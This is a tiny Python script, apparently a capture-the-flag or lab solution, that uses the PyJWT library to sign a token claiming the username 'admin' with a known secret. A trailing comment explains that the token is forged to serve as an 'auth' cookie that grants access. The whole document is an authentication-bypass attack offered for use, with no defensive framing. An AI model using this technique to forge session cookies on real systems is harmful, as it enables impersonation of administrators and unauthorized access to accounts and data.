import jwt

jwt.encode({"username":"admin"},'SECRET_TOKEN',algorithm='HS256')

### This program encodes the values of a user account in jwt to forge a cookie to grant access. Create a cookie named auth, then add the jwt token value in the value section.
